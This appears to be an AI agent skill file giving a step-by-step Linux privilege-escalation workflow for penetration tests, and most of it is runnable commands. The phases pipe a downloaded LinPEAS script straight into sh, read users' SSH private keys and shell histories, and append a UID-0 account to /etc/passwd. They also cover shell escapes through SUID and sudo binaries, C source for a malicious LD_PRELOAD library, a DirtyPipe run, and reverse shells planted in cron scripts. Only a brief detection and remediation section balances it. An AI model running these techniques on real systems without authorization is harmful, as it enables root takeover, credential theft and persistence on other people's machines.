---
name: linux-privilege-escalation
description: >
  Escalate privileges from a low-privilege shell to root on Linux systems using kernel exploits,
  SUID binaries, capabilities, cron jobs, PATH hijacking, and misconfigured services. Use this skill
  during penetration tests after gaining initial access to a Linux host. Covers automated enumeration
  with LinPEAS, manual techniques, Docker/container escapes, and sudo abuse for complete privilege escalation.
domain: cybersecurity
subdomain: penetration-testing
category: Infrastructure
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0004]
  techniques: [T1068, T1548.001, T1053.003]
platforms: [linux]
tags: [privilege-escalation, linux-privesc, suid, kernel-exploit, sudo-abuse, linpeas, pentest, root]
tools: [linpeas, linenum, pspy, gtfobins, linux-exploit-suggester]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Linux Privilege Escalation

## When to Use
- After gaining initial access (low-privilege shell) on a Linux system during a pentest
- When you need to escalate from `www-data`, `nobody`, or a regular user to `root`
- When conducting post-exploitation activities that require elevated privileges


## Prerequisites
- Shell access (user or limited privilege) on the target system
- Enumeration tools appropriate for the target OS (LinPEAS, WinPEAS, etc.)
- Understanding of the target OS privilege model and common misconfigurations
- Ability to transfer files or compile tools on the target

## Workflow

### Phase 1: Automated Enumeration

```bash
# LinPEAS — comprehensive automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy — monitor processes without root (find cron jobs)
./pspy64 -f 2>&1 | tee pspy_output.txt
```

### Phase 2: Quick Wins

```bash
# Check sudo permissions (FIRST THING TO CHECK)
sudo -l
# Look for: (ALL) NOPASSWD: /usr/bin/vim → GTFOBins
# Look for: env_keep+="LD_PRELOAD" → LD_PRELOAD exploit

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Cross-reference with GTFOBins: https://gtfobins.github.io/

# Check capabilities
getcap -r / 2>/dev/null
# python3 with cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Check writable /etc/passwd
ls -la /etc/passwd
# If writable: echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Check writable /etc/shadow
ls -la /etc/shadow

# Check SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /home/*/.ssh/id_rsa

# Check history files
cat ~/.bash_history
cat /home/*/.bash_history
# Look for passwords in command history
```

### Phase 3: SUID/SGID Exploitation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common SUID privesc (via GTFOBins):

# find with SUID
find . -exec /bin/bash -p \;

# vim/vi with SUID
vim -c ':!/bin/bash'

# python with SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (old versions)
nmap --interactive
!sh

# cp with SUID — overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' > /tmp/newpasswd
cp /tmp/newpasswd /etc/passwd

# pkexec (CVE-2021-4034 — PwnKit)
# Affects virtually all Linux distros with polkit installed
```

### Phase 4: Sudo Abuse

```bash
# Check sudo -l output and match to GTFOBins

# sudo vim
sudo vim -c '!bash'

# sudo find
sudo find / -exec /bin/bash \;

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo less/more
sudo less /etc/hosts
!/bin/bash

# sudo tar
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# LD_PRELOAD exploit (if env_keep+="LD_PRELOAD")
# Create malicious shared library:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_binary
```

### Phase 5: Cron Job Exploitation

```bash
# List cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*

# Check for writable cron scripts
ls -la /path/to/cron/script.sh
# If writable: inject reverse shell

# Cron PATH exploitation
# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
# And runs: script.sh (without full path)
# Create /home/user/script.sh with reverse shell

# Monitor cron with pspy
./pspy64
# Watch for periodic root processes
```

### Phase 6: Kernel Exploits

```bash
# Get kernel version
uname -a
cat /etc/os-release

# Check for known kernel exploits
./linux-exploit-suggester.sh

# Major kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8+
# DirtyCow (CVE-2016-5195) — Linux 2.x-4.x
# PwnKit (CVE-2021-4034) — polkit pkexec
# Baron Samedit (CVE-2021-3156) — sudo heap overflow
# Looney Tunables (CVE-2023-4911) — glibc ld.so

# DirtyPipe exploit
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1 "${injected_line}"
```

## 🔵 Blue Team Detection
- **File integrity monitoring**: Alert on changes to SUID/SGID binaries
- **Audit logs**: Monitor sudo usage, capability changes, and cron modifications
- **Patch management**: Keep kernel and system packages updated
- **Principle of least privilege**: Minimize sudo permissions and SUID binaries
- **SELinux/AppArmor**: Enforce mandatory access controls

## Key Concepts
| Concept | Description |
|---------|-------------|
| SUID | Set User ID — binary runs as file owner (often root) |
| Capabilities | Fine-grained privileges instead of full root |
| GTFOBins | Database of Unix binaries that can be exploited |
| PATH hijacking | Abusing PATH variable to execute malicious binaries |
| LD_PRELOAD | Loading malicious shared libraries before legitimate ones |
| Kernel exploit | Exploiting vulnerabilities in the Linux kernel for root |

## Output Format
```
Linux Privilege Escalation Report
==================================
Initial Access: www-data (via web shell)
Target: Ubuntu 22.04 LTS (kernel 5.15.0-88)
Method: SUID binary (python3 with cap_setuid)

Escalation Path:
  www-data → python3 cap_setuid → root

Evidence:
  $ getcap -r / 2>/dev/null
  /usr/bin/python3 = cap_setuid+ep
  
  $ python3 -c 'import os; os.setuid(0); os.system("id")'
  uid=0(root) gid=33(www-data) groups=33(www-data)

Remediation:
1. Remove cap_setuid from python3: setcap -r /usr/bin/python3
2. Audit all capabilities: getcap -r / 2>/dev/null
3. Deploy SELinux in enforcing mode
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- GTFOBins: [SUID/Sudo/Capabilities](https://gtfobins.github.io/)
- HackTricks: [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- LinPEAS: [GitHub](https://github.com/carlospolop/PEASS-ng)
